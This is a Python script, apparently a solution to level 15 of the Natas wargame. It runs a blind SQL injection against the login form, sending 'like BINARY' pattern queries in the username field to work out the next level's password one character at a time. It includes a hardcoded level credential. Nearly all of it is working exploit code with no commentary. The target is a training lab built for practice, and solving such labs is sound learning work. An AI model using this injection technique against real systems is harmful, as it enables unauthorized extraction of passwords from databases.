# -*- coding: utf-8 -*-
from base import get_page, post_page
import re
from string import ascii_letters, digits
from time import sleep

def natas15():
    username = "natas15"
    password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

    s = ascii_letters+digits
    chars = ""

    for i in s:
        print(f"TESTING:{i}")
        data = {"username": f"natas16\" and password like BINARY \"%{i}%"}
        
        while 1:
            try:
                content = post_page(15, username, password, data, url_appending="?debug")
                break
            except:
                print("Fail to connect, wait 5 seconds and retrying...")
                sleep(5)

        if "This user exists" in content:
            chars += i
            print(f"FIND:{chars}")
        sleep(1)
    print(chars)

    pw = ""
    
    for k in range(32):
        print(k)
        for i in chars:
            print(f"TESTING:{i}")
            p = pw+i
            data = {"username": f"natas16\" and password like BINARY \"{p}%"}
            
            while 1:
                try:
                    content = post_page(15, username, password, data, url_appending="?debug")
                    break
                except:
                    print("Fail to connect, wait 5 seconds and retrying...")
                    sleep(5)

            if "This user exists" in content:
                pw += i
                print(f"FIND:{pw}")
                break
            sleep(1)
    print(pw)

if __name__ == "__main__":
    natas15()